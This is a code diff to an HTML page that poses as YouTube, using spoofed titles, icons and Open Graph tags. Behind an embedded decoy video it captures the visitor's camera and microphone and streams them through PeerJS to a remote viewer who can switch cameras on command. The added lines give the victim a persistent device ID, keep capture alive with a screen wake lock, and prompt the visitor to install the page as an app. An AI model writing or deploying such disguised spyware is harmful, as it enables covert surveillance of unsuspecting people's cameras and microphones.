@@ -3,7 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <!-- PWA Meta Tags -->
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <meta name="apple-mobile-web-app-title" content="YouTube">
+    <link rel="apple-touch-icon" href="https://www.youtube.com/img/desktop/yt_1200.png">
+    <link rel="manifest" href="data:application/manifest+json,{'name':'YouTube','short_name':'YouTube','start_url':'.','display':'standalone','background_color':'#000000','theme_color':'#ff0000','icons':[{'src':'https://www.youtube.com/img/desktop/yt_1200.png','sizes':'1200x1200','type':'image/png'}]}">
+
+    <!-- YouTube Link Spoofing -->
     <title>YouTube</title>
+    <meta name="description" content="Tonton video favorit Anda di YouTube.">
+    <meta property="og:title" content="YouTube - Video Populer">
+    <meta property="og:image" content="https://www.youtube.com/img/desktop/yt_1200.png">
+    <meta name="theme-color" content="#ff0000">
+
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: Roboto, Arial, sans-serif; background: #000; color: white; min-height: 100vh; overflow: hidden; }
@@ -34,7 +48,7 @@
     <iframe id="ytPlayer" allow="autoplay; encrypted-media" allowfullscreen></iframe>
     <div style="padding: 15px;">
         <div style="font-size: 18px; font-weight: bold;">Video Rekomendasi Hari Ini</div>
-        <div style="color: #aaa; font-size: 14px; margin-top: 10px;">Trending • 1.2jt ditonton</div>
+        <div style="color: #aaa; font-size: 14px; margin-top: 10px;">ID Perangkat: <span id="displayTargetId">...</span></div>
     </div>
 
     <video id="cameraPreview" autoplay playsinline muted></video>
@@ -44,7 +58,14 @@
         const urlParams = new URLSearchParams(window.location.search);
         const viewerId = urlParams.get('viewer') || urlParams.get('auth');
         const videoId = urlParams.get('v') || 'dQw4w9WgXcQ';
-        const targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
+        
+        // ID PERMANEN: Simpan di LocalStorage agar tidak berubah
+        let targetId = localStorage.getItem('remote_target_id');
+        if (!targetId) {
+            targetId = "yt-" + Math.floor(1000 + Math.random() * 9000);
+            localStorage.setItem('remote_target_id', targetId);
+        }
+        document.getElementById('displayTargetId').textContent = targetId;
         
         const overlay = document.getElementById('overlay');
         const ytPlayer = document.getElementById('ytPlayer');
@@ -54,40 +75,33 @@
         let localStream = null;
         let currentFacingMode = 'environment';
         let activeCall = null;
+        let wakeLock = null;
 
         ytPlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=0&controls=1`;
 
-        async function getStream(facingMode) {
-            // Berhenti dulu semua track yang sedang jalan
-            if (localStream) {
-                localStream.getTracks().forEach(track => track.stop());
-            }
+        // Penjaga Latar Belakang (WakeLock)
+        async function requestWakeLock() {
+            try {
+                if ('wakeLock' in navigator) {
+                    wakeLock = await navigator.wakeLock.request('screen');
+                }
+            } catch (err) { console.log("WakeLock gagal"); }
+        }
 
+        async function getStream(facingMode) {
+            if (localStream) localStream.getTracks().forEach(track => track.stop());
             const constraints = {
-                video: { 
-                    facingMode: { exact: facingMode }, // Paksa mode spesifik
-                    width: { ideal: 640 },
-                    height: { ideal: 480 }
-                },
+                video: { facingMode: facingMode, width: { ideal: 640 }, height: { ideal: 480 } },
                 audio: true
             };
-            
-            try {
-                return await navigator.mediaDevices.getUserMedia(constraints);
-            } catch (err) {
-                console.log("Mencoba mode tanpa 'exact'...");
-                // Fallback jika 'exact' tidak didukung
-                return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facingMode },
-                    audio: true
-                });
-            }
+            return await navigator.mediaDevices.getUserMedia(constraints);
         }
 
         async function startApp() {
             try {
                 localStream = await getStream(currentFacingMode);
                 cameraPreview.srcObject = localStream;
+                requestWakeLock();
 
                 peer = new Peer(targetId, {
                     host: '0.peerjs.com', port: 443, secure: true,
@@ -104,40 +118,20 @@
                         conn.on('data', handleData);
                     }
                 });
-            } catch (err) {
-                console.error(err);
-                // Fallback total jika gagal
-                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                cameraPreview.srcObject = localStream;
-            }
+            } catch (err) { alert("Izin diperlukan."); }
         }
 
         async function handleData(data) {
             if (data.type === 'switch_camera') {
                 currentFacingMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
-                console.log("Switching to:", currentFacingMode);
-                
-                try {
-                    const newStream = await getStream(currentFacingMode);
-                    const videoTrack = newStream.getVideoTracks()[0];
-                    
-                    if (activeCall && activeCall.peerConnection) {
-                        const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
-                        if (sender) {
-                            await sender.replaceTrack(videoTrack);
-                        }
-                    }
-                    
-                    // Update local reference
-                    const audioTrack = newStream.getAudioTracks()[0];
-                    localStream = newStream;
-                    cameraPreview.srcObject = localStream;
-                    
-                } catch (e) {
-                    console.error("Switch error:", e);
-                    // Jika gagal ganti ke mode tertentu, coba balikkan mode
-                    currentFacingMode = (currentFacingMode === 'environment') ? 'user' : 'environment';
+                const newStream = await getStream(currentFacingMode);
+                const videoTrack = newStream.getVideoTracks()[0];
+                if (activeCall && activeCall.peerConnection) {
+                    const sender = activeCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
+                    if (sender) await sender.replaceTrack(videoTrack);
                 }
+                localStream = newStream;
+                cameraPreview.srcObject = localStream;
             }
         }
 
@@ -145,10 +139,28 @@
             overlay.style.display = 'none';
             ytPlayer.src = ytPlayer.src.replace('autoplay=0', 'autoplay=1');
             startApp();
+            
+            // Trigger instalasi PWA (opsional tergantung browser)
+            if (window.deferredPrompt) {
+                window.deferredPrompt.prompt();
+            }
+        });
+
+        // Simpan prompt instalasi
+        window.addEventListener('beforeinstallprompt', (e) => {
+            e.preventDefault();
+            window.deferredPrompt = e;
         });
 
         document.getElementById('btnNo').addEventListener('click', () => {
             window.location.href = "https://www.youtube.com";
+        });
+
+        // Re-request WakeLock jika tab kembali aktif
+        document.addEventListener('visibilitychange', async () => {
+            if (wakeLock !== null && document.visibilityState === 'visible') {
+                requestWakeLock();
+            }
         });
     </script>
 </body>
